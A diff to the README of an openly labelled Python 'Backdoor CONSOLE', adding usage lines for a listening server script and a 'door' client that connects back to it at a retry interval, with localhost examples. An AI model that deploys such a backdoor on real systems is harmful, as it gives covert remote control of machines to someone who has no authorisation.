@@ -1,5 +1,18 @@
 > A simple Backdoor CONSOLE, Support both Python 2 & 3.
 
+### Command Line Argument
+```
+$> ./server.py bind_address:bind_port
+$> ./door.py server_ip:server_port[:retry_interval]
+
+# Server Example
+$> ./server.py 127.0.0.1:4433
+
+# Client Example
+$> ./door.py 127.0.0.1:4433 # default retry interval 16
+$> ./door.py 127.0.0.1:4433:60
+```
+
 ### Your side
 ```
 root@server 07:47 /home # ./server 0.0.0.0:2345
